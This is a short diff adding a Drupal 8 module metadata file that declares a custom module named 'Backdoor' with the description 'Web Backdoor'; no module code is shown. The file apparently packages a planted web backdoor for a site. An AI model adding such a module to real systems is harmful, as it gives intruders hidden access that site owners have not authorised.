@@ -1,0 +1,5 @@
+name: Backdoor
+description: Web Backdoor
+core: 8.x
+package: Custom
+type: module
